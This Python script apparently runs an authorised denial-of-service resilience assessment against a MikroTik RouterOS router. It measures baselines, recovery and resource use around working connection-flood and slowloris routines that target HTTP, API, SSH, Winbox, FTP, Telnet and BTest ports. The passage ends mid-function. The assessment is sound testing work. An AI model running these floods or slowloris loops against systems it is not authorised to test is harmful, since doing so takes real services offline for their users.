#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Denial-of-Service Resilience Assessment
Phase 6
Target: [REDACTED-INTERNAL-IP]

Tests:
  1. Baseline Measurement (~10 tests)
     - CPU, memory, uptime, active connections via REST API
     - Per-service baseline response time (HTTP, API, SSH, Winbox, FTP, Telnet)
  2. Per-Service Connection Floods (~50 tests)
     - 10 / 25 / 50 / max+5 concurrent connections per service
     - CPU/memory monitoring after each batch
  3. Slowloris Attacks (~15 tests)
     - HTTP slowloris with partial headers on port 80
     - API slowloris on port 8728
     - Legitimate connection acceptance during slowloris
  4. Resource Monitoring During Tests (~10 tests)
     - CPU load, free memory, uptime comparison post-category
     - Error log inspection
  5. Recovery Testing (~15 tests)
     - Recovery time measurement after each flood category
     - Service responsiveness post-recovery
     - Orphaned session detection

Estimated: ~100 tests
Evidence: evidence/dos_resilience.json
"""

import socket
import ssl
import sys
import threading
import time
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

# ── Constants ────────────────────────────────────────────────────────────────

SOCKET_TIMEOUT = 5

# Services to test with their ports and connection behavior
SERVICES = {
    "WebFig/REST": {"port": PORTS["http"],   "proto": "tcp"},
    "API":         {"port": PORTS["api"],     "proto": "tcp"},
    "Winbox":      {"port": PORTS["winbox"],  "proto": "tcp"},
    "SSH":         {"port": PORTS["ssh"],     "proto": "tcp"},
    "FTP":         {"port": PORTS["ftp"],     "proto": "tcp"},
    "Telnet":      {"port": PORTS["telnet"],  "proto": "tcp"},
    "BTest":       {"port": PORTS["btest"],   "proto": "tcp"},
}

# MikroTik default max sessions per service (approximate)
MIKROTIK_DEFAULT_MAX_SESSIONS = 20

# Flood levels: number of concurrent connections to test
FLOOD_LEVELS = [10, 25, 50]


# ══════════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════════

def measure_connect_time(port, timeout=SOCKET_TIMEOUT):
    """Measure TCP connect + first-byte response time to a port.
    Returns (success, elapsed_seconds, error_string_or_None).
    """
    start = time.time()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, port))
        elapsed = time.time() - start
        s.close()
        return True, elapsed, None
    except Exception as e:
        elapsed = time.time() - start
        return False, elapsed, str(e)


def hold_connection(port, hold_seconds, result_slot, index, timeout=SOCKET_TIMEOUT):
    """Thread target: connect, hold the socket open, record outcome."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        start = time.time()
        s.connect((TARGET, port))
        connect_time = time.time() - start
        result_slot[index] = {
            "connected": True,
            "connect_time": round(connect_time, 4),
            "error": None,
        }
        # Hold the connection open
        time.sleep(hold_seconds)
        s.close()
    except Exception as e:
        result_slot[index] = {
            "connected": False,
            "connect_time": None,
            "error": str(e),
        }


def open_concurrent_connections(port, count, hold_seconds=5):
    """Open `count` concurrent TCP connections to `port`, hold them, return stats."""
    results_array = [None] * count
    threads = []
    for i in range(count):
        t = threading.Thread(target=hold_connection,
                             args=(port, hold_seconds, results_array, i),
                             daemon=True)
        threads.append(t)

    start = time.time()
    for t in threads:
        t.start()
        time.sleep(0.02)  # slight stagger to avoid local port exhaustion

    for t in threads:
        t.join(timeout=hold_seconds + SOCKET_TIMEOUT + 2)
    wall_time = time.time() - start

    connected = sum(1 for r in results_array if r and r["connected"])
    refused = sum(1 for r in results_array if r and not r["connected"])
    avg_connect = None
    connect_times = [r["connect_time"] for r in results_array
                     if r and r["connected"] and r["connect_time"] is not None]
    if connect_times:
        avg_connect = round(sum(connect_times) / len(connect_times), 4)

    return {
        "requested": count,
        "connected": connected,
        "refused": refused,
        "avg_connect_time": avg_connect,
        "max_connect_time": round(max(connect_times), 4) if connect_times else None,
        "wall_time": round(wall_time, 2),
        "per_connection": results_array,
    }


def get_resource_snapshot():
    """Get CPU load, free memory, uptime from REST API."""
    code, data = rest_get("/system/resource", timeout=SOCKET_TIMEOUT)
    if code == 200 and isinstance(data, dict):
        return {
            "cpu_load": data.get("cpu-load"),
            "free_memory": data.get("free-memory"),
            "total_memory": data.get("total-memory"),
            "uptime": data.get("uptime"),
            "version": data.get("version"),
            "timestamp": time.time(),
        }
    return {"error": f"HTTP {code}", "raw": str(data)[:200], "timestamp": time.time()}


def get_active_sessions():
    """Get active user sessions."""
    code, data = rest_get("/user/active", timeout=SOCKET_TIMEOUT)
    if code == 200 and isinstance(data, list):
        return data
    return []


def check_service_responds(port, timeout=SOCKET_TIMEOUT):
    """Quick check: can we TCP connect to the port?"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, port))
        s.close()
        return True
    except Exception:
        return False


def detect_reboot(baseline_uptime, current_uptime):
    """Compare uptime strings to detect if router rebooted."""
    if baseline_uptime is None or current_uptime is None:
        return False
    # MikroTik uptime format: "1d2h3m4s" or "5h30m12s" etc.
    # If current uptime is significantly shorter than baseline, router rebooted.
    # Simple heuristic: parse to seconds and compare.
    def parse_uptime(s):
        if not isinstance(s, str):
            return 0
        total = 0
        import re
        weeks = re.findall(r'(\d+)w', s)
        days = re.findall(r'(\d+)d', s)
        hours = re.findall(r'(\d+)h', s)
        minutes = re.findall(r'(\d+)m', s)
        secs = re.findall(r'(\d+)s', s)
        if weeks: total += int(weeks[0]) * 604800
        if days: total += int(days[0]) * 86400
        if hours: total += int(hours[0]) * 3600
        if minutes: total += int(minutes[0]) * 60
        if secs: total += int(secs[0])
        return total

    base_s = parse_uptime(baseline_uptime)
    cur_s = parse_uptime(current_uptime)
    # If current is much less than baseline, reboot happened
    if base_s > 0 and cur_s < base_s * 0.5:
        return True
    return False


# ══════════════════════════════════════════════════════════════════════════════
# Section 1: Baseline Measurement
# ══════════════════════════════════════════════════════════════════════════════

def measure_baseline(ec):
    """Record baseline CPU, memory, uptime, response times."""
    log("=" * 60)
    log("SECTION 1: Baseline Measurement")
    log("=" * 60)

    baseline = {}

    # 1a. System resource baseline
    snap = get_resource_snapshot()
    ec.add_test("baseline", "System resource baseline",
                "Record baseline CPU load, memory, uptime via REST API",
                f"CPU={snap.get('cpu_load')}%, free_mem={snap.get('free_memory')}, "
                f"uptime={snap.get('uptime')}",
                details=snap)
    baseline["resource"] = snap

    # 1b. Active sessions baseline
    sessions = get_active_sessions()
    ec.add_test("baseline", "Active sessions baseline",
                "Record number of active user sessions before testing",
                f"{len(sessions)} active sessions",
                details={"sessions": sessions})
    baseline["active_sessions"] = len(sessions)

    # 1c. Per-service response time baseline
    service_baselines = {}
    for svc_name, svc_info in SERVICES.items():
        port = svc_info["port"]
        ok, elapsed, err = measure_connect_time(port)
        service_baselines[svc_name] = {
            "port": port,
            "reachable": ok,
            "connect_time": round(elapsed, 4) if ok else None,
            "error": err,
        }
        ec.add_test("baseline", f"Baseline response: {svc_name} (:{port})",
                     f"Measure baseline TCP connect time to {svc_name}",
                     f"{'OK' if ok else 'FAIL'} in {elapsed:.4f}s"
                     + (f" ({err})" if err else ""),
                     details=service_baselines[svc_name],
                     anomaly=not ok)

    baseline["service_baselines"] = service_baselines

    # 1d. REST API response time (authenticated GET)
    start = time.time()
    code, data = rest_get("/system/resource")
    api_elapsed = time.time() - start
    baseline["rest_response_time"] = round(api_elapsed, 4)
    ec.add_test("baseline", "REST API response time",
                "Measure authenticated REST API GET response time",
                f"HTTP {code} in {api_elapsed:.4f}s",
                details={"status_code": code, "elapsed": round(api_elapsed, 4)})

    return baseline


# ══════════════════════════════════════════════════════════════════════════════
# Section 2: Per-Service Connection Floods
# ══════════════════════════════════════════════════════════════════════════════

def run_connection_floods(ec, baseline):
    """Open concurrent connections to each service at increasing levels."""
    log("=" * 60)
    log("SECTION 2: Per-Service Connection Floods")
    log("=" * 60)

    total_crashes = 0
    flood_results = {}

    for svc_name, svc_info in SERVICES.items():
        port = svc_info["port"]
        svc_results = []
        log(f"--- Flooding {svc_name} (port {port}) ---")

        # Check service is up before starting
        if not check_service_responds(port):
            ec.add_test("flood", f"Flood pre-check: {svc_name}",
                         f"Verify {svc_name} is reachable before flood testing",
                         f"Service on port {port} is NOT reachable - skipping",
                         anomaly=True)
            continue

        # Test each flood level
        for level in FLOOD_LEVELS:
            log(f"  Opening {level} concurrent connections to {svc_name}...")
            stats = open_concurrent_connections(port, level, hold_seconds=3)

            degradation = None
            base_ct = (baseline.get("service_baselines", {})
                       .get(svc_name, {}).get("connect_time"))
            if base_ct and stats["avg_connect_time"]:
                degradation = round(stats["avg_connect_time"] / base_ct, 2)

            result_str = (f"{stats['connected']}/{stats['requested']} connected, "
                          f"{stats['refused']} refused, "
                          f"avg={stats['avg_connect_time']}s")
            if degradation:
                result_str += f", degradation={degradation}x"

            anomaly = (stats["refused"] > 0 or
                       (degradation is not None and degradation > 5))

            ec.add_test("flood", f"Flood {svc_name} x{level}",
                         f"Open {level} concurrent TCP connections to {svc_name} (:{port})",
                         result_str,
                         details={
                             "service": svc_name, "port": port,
                             "level": level,
                             "connected": stats["connected"],
                             "refused": stats["refused"],
                             "avg_connect_time": stats["avg_connect_time"],
                             "max_connect_time": stats["max_connect_time"],
                             "degradation_factor": degradation,
                             "wall_time": stats["wall_time"],
                         },
                         anomaly=anomaly)
            svc_results.append(stats)

            # Brief pause between levels
            time.sleep(1)

        # Test max-sessions + 5 (over the default limit)
        over_limit = MIKROTIK_DEFAULT_MAX_SESSIONS + 5
        log(f"  Opening {over_limit} connections (max+5) to {svc_name}...")
        stats = open_concurrent_connections(port, over_limit, hold_seconds=3)

        refused_pct = (stats["refused"] / stats["requested"] * 100
                       if stats["requested"] > 0 else 0)
        ec.add_test("flood", f"Flood {svc_name} over-limit ({over_limit})",
                     f"Open {over_limit} connections (default max + 5) to {svc_name}",
                     f"{stats['connected']}/{stats['requested']} connected, "
                     f"{stats['refused']} refused ({refused_pct:.0f}%)",
                     details={
                         "service": svc_name, "port": port,
                         "level": over_limit,
                         "connected": stats["connected"],
                         "refused": stats["refused"],
                         "refused_pct": round(refused_pct, 1),
                         "avg_connect_time": stats["avg_connect_time"],
                     },
                     anomaly=stats["refused"] > 0)

        # If all connections refused beyond limit, note it
        if stats["refused"] > MIKROTIK_DEFAULT_MAX_SESSIONS * 0.8:
            ec.add_finding("INFO",
                           f"{svc_name} enforces connection limit",
                           f"{svc_name} on port {port} refused {stats['refused']}/{over_limit} "
                           f"connections when exceeding the default session limit of "
                           f"{MIKROTIK_DEFAULT_MAX_SESSIONS}. This is expected behavior.",
                           evidence_refs=[f"flood_{svc_name}_overlimit"])

        svc_results.append(stats)

        # Check CPU/memory after flooding this service
        time.sleep(1)
        post_snap = get_resource_snapshot()
        cpu_load = int(post_snap.get("cpu_load") or 0)
        ec.add_test("flood", f"Post-flood resource: {svc_name}",
                     f"Check CPU/memory after flooding {svc_name}",
                     f"CPU={cpu_load}%, free_mem={post_snap.get('free_memory')}",
                     details=post_snap,
                     anomaly=(cpu_load > 90))

        if cpu_load > 90:
            ec.add_finding("MEDIUM",
                           f"High CPU after {svc_name} connection flood",
                           f"CPU load reached {cpu_load}% after flooding {svc_name} "
                           f"with concurrent connections. Sustained high CPU under "
                           f"connection pressure may indicate DoS vulnerability.",
                           cwe="CWE-400",
                           evidence_refs=[f"flood_{svc_name}_resource"])

        # Verify service still responds
        still_up = check_service_responds(port)
        ec.add_test("flood", f"Post-flood alive: {svc_name}",
                     f"Verify {svc_name} still responds after flood",
                     f"{'Responsive' if still_up else 'NOT RESPONDING'}",
                     anomaly=not still_up)

        if not still_up:
            ec.add_finding("HIGH",
                           f"{svc_name} unresponsive after connection flood",
                           f"{svc_name} on port {port} stopped responding after "
                           f"connection flood testing. This indicates a potential "
                           f"denial-of-service vulnerability.",
                           cwe="CWE-400",
                           evidence_refs=[f"flood_{svc_name}"])
            total_crashes += 1

        # Check for reboot
        cur_uptime = post_snap.get("uptime")
        if detect_reboot(baseline["resource"].get("uptime"), cur_uptime):
            ec.add_finding("CRITICAL",
                           f"Router rebooted during {svc_name} flood",
                           f"Router uptime changed from "
                           f"{baseline['resource'].get('uptime')} to {cur_uptime}, "
                           f"indicating a reboot during {svc_name} connection flood.",
                           cwe="CWE-400",
                           evidence_refs=[f"flood_{svc_name}_reboot"])
            total_crashes += 1
            wait_for_router()

        flood_results[svc_name] = svc_results

        # Brief recovery pause between services
        time.sleep(2)

    return flood_results, total_crashes


# ══════════════════════════════════════════════════════════════════════════════
# Section 3: Slowloris Attacks
# ══════════════════════════════════════════════════════════════════════════════

def slowloris_thread(port, conn_id, results_dict, duration=30, interval=5):
    """Single slowloris connection: send partial HTTP header bytes slowly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((TARGET, port))

        # Send a partial HTTP request line
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {TARGET}\r\n".encode())

        # Keep the connection alive by sending one header byte at a time
        headers_sent = 0
        start = time.time()
        alive = True
        while time.time() - start < duration and alive:
            try:
                # Send a partial header to keep connection alive
                s.send(f"X-Slowloris-{headers_sent}: ".encode())
                time.sleep(interval)
                s.send(b"a\r\n")
                headers_sent += 1
            except Exception:
                alive = False

        elapsed = time.time() - start
        s.close()
        results_dict[conn_id] = {
            "connected": True,
            "headers_sent": headers_sent,
            "duration": round(elapsed, 2),
            "completed": elapsed >= duration,
        }
    except Exception as e:
        results_dict[conn_id] = {
            "connected": False,
            "error": str(e),
            "headers_sent": 0,
        }


def api_slowloris_thread(port, conn_id, results_dict, duration=30, interval=5):
    """Single slowloris connection against RouterOS API: send partial data slowly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((TARGET, port))

        # Send a partial RouterOS API word (length byte but no data)
        bytes_sent = 0
        start = time.time()
        alive = True
        while time.time() - start < duration and alive:
            try:
                s.send(b"\x01")  # partial length byte
                bytes_sent += 1
                time.sleep(interval)
            except Exception:
                alive = False

        elapsed = time.time() - start
        s.close()
        results_dict[conn_id] = {
            "connected": True,
            "bytes_sent": bytes_sent,
            "duration": round(elapsed, 2),
            "completed": elapsed >= duration,
        }
    except Exception as e:
        results_dict[conn_id] = {
            "connected": False,
            "error": str(e),
            "bytes_sent": 0,
        }


def run_slowloris(ec, baseline):
    """Run slowloris-style attacks against HTTP and API services."""
    log("=" * 60)
    log("SECTION 3: Slowloris Attacks")
    log("=" * 60)

    # ── 3a. HTTP Slowloris on port 80 ────────────────────────────────────

    log("--- HTTP Slowloris (port 80, 20 connections, 30s) ---")
    num_slowloris = 20
    slowloris_duration = 30
    slowloris_results = {}
    threads = []

    for i in range(num_slowloris):
        t = threading.Thread(target=slowloris_thread,
                             args=(PORTS["http"], i, slowloris_results,
                                   slowloris_duration, 5),
                             daemon=True)
        threads.append(t)

    for t in threads:
        t.start()
        time.sleep(0.1)

    # Wait a few seconds for connections to establish, then test legitimate access
    time.sleep(5)

    # Test 1: Can we still make a legitimate HTTP connection during slowloris?
    log("  Testing legitimate HTTP access during slowloris...")
    legit_ok, legit_time, legit_err = measure_connect_time(PORTS["http"])
    ec.add_test("slowloris", "HTTP legit during slowloris (connect)",
                "Attempt legitimate TCP connect to port 80 during slowloris attack",
                f"{'OK' if legit_ok else 'BLOCKED'} in {legit_time:.4f}s"
                + (f" ({legit_err})" if legit_err else ""),
                details={"success": legit_ok, "time": round(legit_time, 4),
                         "error": legit_err},
                anomaly=not legit_ok)

    # Test 2: Can we make an authenticated REST call during slowloris?
    start = time.time()
    code, data = rest_get("/system/resource", timeout=10)
    rest_time = time.time() - start
    rest_ok = (code == 200)
    ec.add_test("slowloris", "REST API during slowloris",
                "Attempt authenticated REST API call during HTTP slowloris attack",
                f"HTTP {code} in {rest_time:.4f}s",
                details={"status_code": code, "elapsed": round(rest_time, 4),
                         "success": rest_ok},
                anomaly=not rest_ok)

    # Test 3: Can we still SSH during slowloris?
    ssh_ok, ssh_time, ssh_err = measure_connect_time(PORTS["ssh"])
    ec.add_test("slowloris", "SSH during HTTP slowloris",
                "Verify SSH is unaffected by HTTP slowloris attack",
                f"{'OK' if ssh_ok else 'FAIL'} in {ssh_time:.4f}s",
                details={"success": ssh_ok, "time": round(ssh_time, 4)})

    # Wait for slowloris threads to finish
    for t in threads:
        t.join(timeout=slowloris_duration + 10)

    # Summarize slowloris results
    connected = sum(1 for r in slowloris_results.values() if r.get("connected"))
    completed = sum(1 for r in slowloris_results.values() if r.get("completed"))
    ec.add_test("slowloris", "HTTP slowloris summary",
                f"Summary of {num_slowloris}-connection HTTP slowloris attack",
                f"{connected}/{num_slowloris} connected, {completed} held for "
                f"full {slowloris_duration}s duration",
                details={"total": num_slowloris, "connected": connected,
                         "completed": completed,
                         "per_connection": slowloris_results})

    if not legit_ok or not rest_ok:
        ec.add_finding("MEDIUM",
                       "HTTP slowloris blocks legitimate connections",
                       f"During a {num_slowloris}-connection slowloris attack on port 80, "
                       f"legitimate access was {'blocked' if not legit_ok else 'degraded'}. "
                       f"REST API was {'blocked' if not rest_ok else 'degraded'}.",
                       cwe="CWE-400",
                       evidence_refs=["slowloris_http"])

    # Resource check after HTTP slowloris
    time.sleep(2)
    post_snap = get_resource_snapshot()
    ec.add_test("slowloris", "Resource after HTTP slowloris",
                "Check CPU/memory after HTTP slowloris attack",
                f"CPU={post_snap.get('cpu_load')}%, "
                f"free_mem={post_snap.get('free_memory')}",
                details=post_snap)

    # ── 3b. API Slowloris on port 8728 ───────────────────────────────────

    log("--- API Slowloris (port 8728, 20 connections, 30s) ---")
    api_slowloris_results = {}
    api_threads = []

    for i in range(num_slowloris):
        t = threading.Thread(target=api_slowloris_thread,
                             args=(PORTS["api"], i, api_slowloris_results,
                                   slowloris_duration, 5),
                             daemon=True)
        api_threads.append(t)

    for t in api_threads:
        t.start()
        time.sleep(0.1)

    time.sleep(5)

    # Can we still connect to the API during slowloris?
    api_legit_ok, api_legit_time, api_legit_err = measure_connect_time(PORTS["api"])
    ec.add_test("slowloris", "API legit during API slowloris (connect)",
                "Attempt legitimate TCP connect to API port during slowloris",
                f"{'OK' if api_legit_ok else 'BLOCKED'} in {api_legit_time:.4f}s"
                + (f" ({api_legit_err})" if api_legit_err else ""),
                details={"success": api_legit_ok, "time": round(api_legit_time, 4),
                         "error": api_legit_err},
                anomaly=not api_legit_ok)

    # Can we still reach HTTP during API slowloris?
    http_during_api = check_service_responds(PORTS["http"])
    ec.add_test("slowloris", "HTTP during API slowloris",
                "Verify HTTP is unaffected by API slowloris attack",
                f"{'Responsive' if http_during_api else 'NOT RESPONDING'}",
                anomaly=not http_during_api)

    for t in api_threads:
        t.join(timeout=slowloris_duration + 10)

    api_connected = sum(1 for r in api_slowloris_results.values() if r.get("connected"))
    api_completed = sum(1 for r in api_slowloris_results.values() if r.get("completed"))
    ec.add_test("slowloris", "API slowloris summary",
                f"Summary of {num_slowloris}-connection API slowloris attack",
                f"{api_connected}/{num_slowloris} connected, {api_completed} held full duration",
                details={"total": num_slowloris, "connected": api_connected,
                         "completed": api_completed,
                         "per_connection": api_slowloris_results})

    if not api_legit_ok:
        ec.add_finding("MEDIUM",
                       "API slowloris blocks legitimate API connections",
                       f"During a {num_slowloris}-connection slowloris attack on the "
                       f"RouterOS API (port {PORTS['api']}), legitimate API connections "
                       f"were blocked.",
                       cwe="CWE-400",
                       evidence_refs=["slowloris_api"])

    # Resource check after API slowloris
    time.sleep(2)
    post_snap = get_resource_snapshot()
    ec.add_test("slowloris", "Resource after API slowloris",
                "Check CPU/memory after API slowloris attack",
                f"CPU={post_snap.get('cpu_load')}%, "
                f"free_mem={post_snap.get('free_memory')}",
                details=post_snap)

    # ── 3c. Measure time until HTTP stops accepting under sustained slowloris ──

    log("--- Measuring slowloris saturation point (port 80) ---")
    # Open connections one-by-one until a legitimate connection fails
    saturation_sockets = []
    saturation_count = 0
    max_test = 100  # safety cap

    for i in range(max_test):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((TARGET, PORTS["http"]))
            # Send partial HTTP to keep it open
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {TARGET}\r\n".encode())
            saturation_sockets.append(s)
            saturation_count += 1
        except Exception:
            break

        # Every 10 connections, check if a new legitimate connection still works
        if (i + 1) % 10 == 0:
            test_ok, _, _ = measure_connect_time(PORTS["http"], timeout=3)
            if not test_ok:
                break

    # Check if legitimate connections are still accepted
    final_ok, final_time, final_err = measure_connect_time(PORTS["http"], timeout=3)

    ec.add_test("slowloris", "HTTP slowloris saturation point",
                "Determine how many slowloris connections needed to block HTTP",
                f"Opened {saturation_count} slowloris connections, "
                f"legit after: {'OK' if final_ok else 'BLOCKED'}",
                details={"connections_opened": saturation_count,
                         "legitimate_after": final_ok,
                         "max_tested": max_test},
                anomaly=not final_ok)

    if not final_ok:
        ec.add_finding("MEDIUM",
                       f"HTTP service saturated at {saturation_count} slowloris connections",
                       f"After opening {saturation_count} slow HTTP connections on port 80, "
                       f"the service stopped accepting new connections. This indicates "
                       f"susceptibility to slowloris-style DoS attacks.",
                       cwe="CWE-400",
                       evidence_refs=["slowloris_saturation"])

    # Clean up saturation sockets
    for s in saturation_sockets:
        try:
            s.close()
        except Exception:
            pass

    time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════════
# Section 4: Resource Monitoring
# ══════════════════════════════════════════════════════════════════════════════

def run_resource_monitoring(ec, baseline):
    """Post-test resource monitoring and comparison against baseline."""
    log("=" * 60)
    log("SECTION 4: Resource Monitoring")
    log("=" * 60)

    # 4a. Current resource snapshot
    current = get_resource_snapshot()
    ec.add_test("resource_monitor", "Post-test resource snapshot",
                "Capture system resource state after all DoS tests",
                f"CPU={current.get('cpu_load')}%, "
                f"free_mem={current.get('free_memory')}, "
                f"uptime={current.get('uptime')}",
                details=current)

    # 4b. Compare against baseline
    base_cpu = int(baseline["resource"].get("cpu_load") or 0)
    cur_cpu = int(current.get("cpu_load") or 0)
    cpu_delta = None
    if base_cpu is not None and cur_cpu is not None:
        cpu_delta = cur_cpu - base_cpu

    base_mem = baseline["resource"].get("free_memory")
    cur_mem = current.get("free_memory")
    mem_delta = None
    if base_mem is not None and cur_mem is not None:
        try:
            mem_delta = int(cur_mem) - int(base_mem)
        except (ValueError, TypeError):
            pass

    ec.add_test("resource_monitor", "Resource comparison vs baseline",
                "Compare current CPU/memory to pre-test baseline",
                f"CPU delta={cpu_delta}% (base={base_cpu}%, now={cur_cpu}%), "
                f"memory delta={mem_delta} bytes",
                details={
                    "baseline_cpu": base_cpu, "current_cpu": cur_cpu,
                    "cpu_delta": cpu_delta,
                    "baseline_memory": base_mem, "current_memory": cur_mem,
                    "memory_delta": mem_delta,
                },
                anomaly=(cpu_delta is not None and int(cpu_delta) > 50))

    if cur_cpu is not None and int(cur_cpu) > 90:
        ec.add_finding("MEDIUM",
                       "Sustained high CPU after DoS testing",
                       f"CPU load is {cur_cpu}% after completion of all DoS test "
                       f"categories (baseline was {base_cpu}%). This indicates the "
                       f"router has not fully recovered.",
                       cwe="CWE-400",
                       evidence_refs=["resource_monitor_cpu"])

    # 4c. Check for low memory
    total_mem = current.get("total_memory")
    if cur_mem is not None and total_mem is not None:
        try:
            free_pct = int(cur_mem) / int(total_mem) * 100
            ec.add_test("resource_monitor", "Memory utilization check",
                        "Verify free memory is above 10% threshold",
                        f"Free: {free_pct:.1f}% ({cur_mem}/{total_mem})",
                        details={"free_pct": round(free_pct, 1),
                                 "free_memory": cur_mem,
                                 "total_memory": total_mem},
                        anomaly=free_pct < 10)

            if free_pct < 10:
                ec.add_finding("HIGH",
                               "Memory exhaustion after DoS testing",
                               f"Free memory is only {free_pct:.1f}% after DoS testing. "
                               f"This could indicate a memory leak triggered by the "
                               f"connection flood tests.",
                               cwe="CWE-401",
                               evidence_refs=["resource_monitor_memory"])
        except (ValueError, TypeError):
            ec.add_test("resource_monitor", "Memory utilization check",
                        "Verify free memory percentage",
                        f"Could not parse memory values: free={cur_mem}, total={total_mem}")

    # 4d. Reboot detection
    base_uptime = baseline["resource"].get("uptime")
    cur_uptime = current.get("uptime")
    rebooted = detect_reboot(base_uptime, cur_uptime)
    ec.add_test("resource_monitor", "Reboot detection",
                "Compare uptime to detect any reboots during testing",
                f"Baseline uptime={base_uptime}, current={cur_uptime}, "
                f"reboot={'DETECTED' if rebooted else 'none'}",
                details={"baseline_uptime": base_uptime,
                         "current_uptime": cur_uptime,
                         "reboot_detected": rebooted},
                anomaly=rebooted)

    if rebooted:
        ec.add_finding("CRITICAL",
                       "Router rebooted during DoS testing",
                       f"Router uptime changed from {base_uptime} to {cur_uptime}, "
                       f"indicating at least one reboot occurred during the DoS "
                       f"resilience assessment.",
                       cwe="CWE-400",
                       evidence_refs=["resource_monitor_reboot"])

    # 4e. Check router logs for error entries generated during testing
    log("  Checking router logs for errors...")
    code, log_data = rest_get("/log", timeout=10)
    error_entries = []
    if code == 200 and isinstance(log_data, list):
        keywords = ["error", "critical", "out of memory", "crash",
                     "panic", "overload", "denied", "limit"]
        for entry in log_data:
            msg = entry.get("message", "").lower()
            if any(kw in msg for kw in keywords):
                error_entries.append(entry)

        ec.add_test("resource_monitor", "Error log entries during testing",
                    "Scan router logs for error/critical entries from DoS testing",
                    f"{len(error_entries)} error entries found in {len(log_data)} total",
                    details={"error_count": len(error_entries),
                             "total_log_entries": len(log_data),
                             "errors": error_entries[:30]},
                    anomaly=len(error_entries) > 5)
    else:
        ec.add_test("resource_monitor", "Error log entries during testing",
                    "Scan router logs for errors",
                    f"Could not retrieve logs: HTTP {code}",
                    anomaly=True)

    # 4f. Active sessions check - any orphaned?
    post_sessions = get_active_sessions()
    session_delta = len(post_sessions) - baseline["active_sessions"]
    ec.add_test("resource_monitor", "Session count comparison",
                "Compare active session count to baseline (detect orphans)",
                f"Baseline={baseline['active_sessions']}, "
                f"now={len(post_sessions)}, delta={session_delta}",
                details={"baseline_sessions": baseline["active_sessions"],
                         "current_sessions": len(post_sessions),
                         "delta": session_delta,
                         "current_session_list": post_sessions},
                anomaly=session_delta > 5)

    return current


# ══════════════════════════════════════════════════════════════════════════════
# Section 5: Recovery Testing
# ══════════════════════════════════════════════════════════════════════════════

def run_recovery_tests(ec, baseline):
    """After a fresh round of floods, measure recovery characteristics."""
    log("=" * 60)
    log("SECTION 5: Recovery Testing")
    log("=" * 60)

    # Run a moderate flood on each service, then measure recovery
    recovery_results = {}

    for svc_name, svc_info in SERVICES.items():
        port = svc_info["port"]

        if not check_service_responds(port):
            ec.add_test("recovery", f"Recovery pre-check: {svc_name}",
                        f"Verify {svc_name} is reachable before recovery test",
                        f"Port {port} NOT reachable - skipping",
                        anomaly=True)
            continue

        log(f"--- Recovery test: {svc_name} (port {port}) ---")

        # Phase A: Flood with 50 connections
        log(f"  Flooding {svc_name} with 50 connections...")
        stats = open_concurrent_connections(port, 50, hold_seconds=5)

        ec.add_test("recovery", f"Recovery flood: {svc_name}",
                    f"Flood {svc_name} with 50 connections before measuring recovery",
                    f"{stats['connected']}/{stats['requested']} connected",
                    details={"service": svc_name, "connected": stats["connected"],
                             "refused": stats["refused"]})

        # Phase B: Immediately after flood ends, measure how quickly service recovers
        log(f"  Measuring recovery time for {svc_name}...")
        recovery_start = time.time()
        recovery_checks = []
        recovered = False
        recovery_time = None

        # Check every 0.5 seconds for up to 15 seconds
        for check_num in range(30):
            ok, ct, err = measure_connect_time(port, timeout=2)
            elapsed_since_flood = time.time() - recovery_start
            recovery_checks.append({
                "check_num": check_num,
                "elapsed": round(elapsed_since_flood, 2),
                "success": ok,
                "connect_time": round(ct, 4) if ok else None,
            })
            if ok and not recovered:
                recovered = True
                recovery_time = round(elapsed_since_flood, 2)
                # Continue checking a few more times to confirm stability
                if check_num > 3:
                    break
            time.sleep(0.5)

        ec.add_test("recovery", f"Recovery time: {svc_name}",
                    f"Measure time for {svc_name} to accept connections after 50-conn flood",
                    f"Recovery in {recovery_time}s" if recovered
                    else f"NOT recovered within {round(time.time() - recovery_start, 1)}s",
                    details={
                        "service": svc_name, "port": port,
                        "recovered": recovered,
                        "recovery_time_seconds": recovery_time,
                        "checks": recovery_checks,
                    },
                    anomaly=not recovered or (recovery_time is not None and recovery_time > 5))

        if not recovered:
            ec.add_finding("HIGH",
                           f"{svc_name} did not recover after connection flood",
                           f"{svc_name} on port {port} failed to accept new connections "
                           f"within 15 seconds after a 50-connection flood ended.",
                           cwe="CWE-400",
                           evidence_refs=[f"recovery_{svc_name}"])

        recovery_results[svc_name] = {
            "recovered": recovered,
            "recovery_time": recovery_time,
        }

        time.sleep(1)

    # Check CPU/memory recovery
    log("  Waiting 5 seconds for resource recovery...")
    time.sleep(5)
    post_recovery = get_resource_snapshot()
    base_cpu = int(baseline["resource"].get("cpu_load") or 0)
    cur_cpu = int(post_recovery.get("cpu_load") or 0)

    cpu_recovered = True
    if base_cpu is not None and cur_cpu is not None:
        cpu_recovered = (cur_cpu <= base_cpu + 20)  # within 20% of baseline

    ec.add_test("recovery", "CPU recovery after all floods",
                "Check if CPU has returned near baseline after all recovery floods",
                f"CPU now={cur_cpu}% (baseline={base_cpu}%), "
                f"{'recovered' if cpu_recovered else 'still elevated'}",
                details={"baseline_cpu": base_cpu, "current_cpu": cur_cpu,
                         "recovered": cpu_recovered},
                anomaly=not cpu_recovered)

    # Verify ALL services respond after full recovery
    all_up = True
    for svc_name, svc_info in SERVICES.items():
        port = svc_info["port"]
        responds = check_service_responds(port)
        ec.add_test("recovery", f"Final service check: {svc_name}",
